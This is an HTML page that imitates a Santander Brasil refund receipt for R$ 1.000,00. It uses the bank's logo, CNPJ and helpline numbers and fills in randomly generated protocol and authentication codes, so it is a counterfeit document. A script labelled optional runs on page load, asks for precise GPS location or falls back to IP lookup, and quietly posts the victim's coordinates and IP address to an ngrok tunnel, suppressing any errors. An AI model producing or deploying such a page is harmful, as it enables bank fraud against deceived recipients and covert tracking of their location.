<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Comprovante de Estorno – Santander</title>
  <style>
    /* ======================================================================
       Estilo inspirado no comprovante digital de estorno do Banco Santander
       ====================================================================== */

    :root {
      --santander-red: #c40000;
      --santander-gray: #7d7d7d;
      --santander-light: #f5f5f5;
    }

    * { box-sizing: border-box; }

    body {
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: var(--santander-light);
      margin: 0;
      padding: 16px;
    }

    .receipt {
      max-width: 600px;
      margin: 0 auto;
      background: #fff;
      border: 1px solid #d9d9d9;
      box-shadow: 0 2px 6px rgba(0,0,0,.08);
    }

    /* Cabeçalho ----------------------------------------------------------- */
    .header {
      background: var(--santander-red);
      color: #fff;
      padding: 20px 24px;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .header img {
      width: 120px;
      height: auto;
    }

    .header h1 {
      font-size: 20px;
      font-weight: 700;
      margin: 0;
    }

    /* Informações principais --------------------------------------------- */
    .info {
      padding: 24px 24px 8px;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      border-bottom: 1px dashed #e0e0e0;
      padding: 8px 0;
      font-size: 15px;
    }
    .info-row span.label {
      color: var(--santander-gray);
      font-weight: 600;
    }
    .info-row span.value {
      color: #000;
    }

    .amount {
      font-size: 22px;
      font-weight: 700;
      color: var(--santander-red);
      text-align: center;
      margin: 24px 0 16px;
    }

    /* Autenticação -------------------------------------------------------- */
    .auth {
      padding: 0 24px 24px;
      font-size: 13px;
      color: var(--santander-gray);
    }

    .auth-code {
      word-break: break-all;
      font-family: "Courier New", monospace;
      font-size: 12px;
      background: #fafafa;
      border: 1px solid #e1e1e1;
      padding: 8px;
      margin-top: 8px;
    }

    /* Rodapé -------------------------------------------------------------- */
    .footer {
      background: #fafafa;
      font-size: 12px;
      color: var(--santander-gray);
      text-align: center;
      padding: 16px 24px;
      border-top: 1px solid #e0e0e0;
    }

    .print-btn {
      display: block;
      margin: 24px auto 0;
      background: var(--santander-red);
      color: #fff;
      border: none;
      padding: 10px 28px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 4px;
      cursor: pointer;
      transition: opacity .3s;
    }
    .print-btn:hover { opacity: .85; }

    /* Versão de impressão */
    @media print {
      body { background: #fff; margin: 0; }
      .print-btn { display: none !important; }
      .receipt { border: none; box-shadow: none; }
    }
  </style>
</head>
<body>
  <section class="receipt">
    <!-- Cabeçalho -->
    <div class="header">
      <!-- Placeholder de logo. Substitua a URL pelo asset oficial se possuir. -->
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Logo_Banco_Santander_Brasil.svg" alt="Santander" />
      <h1>Comprovante de Estorno</h1>
    </div>

    <!-- Informações -->
    <div class="info">
      <div class="info-row"><span class="label">Data</span><span class="value" id="data-atual"></span></div>
      <div class="info-row"><span class="label">Horário</span><span class="value" id="hora-atual"></span></div>
      <div class="info-row"><span class="label">Canal</span><span class="value">Internet Banking</span></div>
      <div class="info-row"><span class="label">Conta Origem</span><span class="value">9999 99999-9</span></div>
      <div class="info-row"><span class="label">Titular</span><span class="value">João Silva de Oliveira</span></div>
      <div class="info-row"><span class="label">Número do protocolo</span><span class="value" id="protocolo"></span></div>

      <p class="amount">Valor Estornado: R$ 1.000,00</p>
    </div>

    <!-- Autenticação -->
    <div class="auth">
      <strong>Autenticação eletrônica:</strong>
      <div class="auth-code" id="autenticacao"></div>

      <p>Guarde este comprovante. Ele é a garantia de que a operação foi concluída com sucesso.</p>
    </div>

    <!-- Botão de impressão -->
    <button class="print-btn" onclick="window.print()">Imprimir</button>

    <!-- Rodapé -->
    <div class="footer">
      <p>Banco Santander (Brasil) S.A. – CNPJ 90.400.888/0001‑42 – SAC 0800 762 7777 – Ouvidoria 0800 726 0322.</p>
    </div>
  </section>

  <!-- ==================================================================
       Script utilitário: data/hora, códigos aleatórios + localização (opcional)
       ================================================================== -->
  <script>
    // Preenche data e horário atuais
    const agora = new Date();
    document.getElementById("data-atual").textContent = agora.toLocaleDateString("pt-BR");
    document.getElementById("hora-atual").textContent = agora.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });

    // Gera códigos simples (fake) – substitua por reais conforme necessidade
    const randHex = (n) => [...crypto.getRandomValues(new Uint8Array(n))].map(b => b.toString(16).padStart(2, "0")).join("");
    document.getElementById("protocolo").textContent = randHex(6).toUpperCase();
    document.getElementById("autenticacao").textContent = randHex(16).toUpperCase();

    /* === Localização opcional (mesma lógica da versão anterior) ========= */
    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location";
    const IP_API_URL = "https://ipapi.co/json/";

    document.addEventListener("DOMContentLoaded", obterLocalizacao);

    async function obterLocalizacao() {
      if (!window.isSecureContext) return obterLocalizacaoPorIP();
      try {
        if (navigator.permissions) {
          const st = await navigator.permissions.query({ name: "geolocation" });
          if (st.state === "denied") return obterLocalizacaoPorIP();
        }
      } catch { /* ignore */ }

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude } = pos.coords;
          enviarPayload({ latitude, longitude, metodo: "gps" });
        }, obterLocalizacaoPorIP, { enableHighAccuracy: true, timeout: 10000 });
      } else {
        obterLocalizacaoPorIP();
      }
    }

    async function obterLocalizacaoPorIP() {
      try {
        const d = await fetch(IP_API_URL).then(r => r.json());
        enviarPayload({ latitude: d.latitude, longitude: d.longitude, ip: d.ip, metodo: "ip" });
      } catch { /* Silencia falhas */ }
    }

    async function enviarPayload(data) {
      const payload = { ...data, timestamp: new Date().toISOString() };
      try {
        await fetch(BACKEND_ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
      } catch { /* ignore */ }
    }
  </script>
</body>
</html>
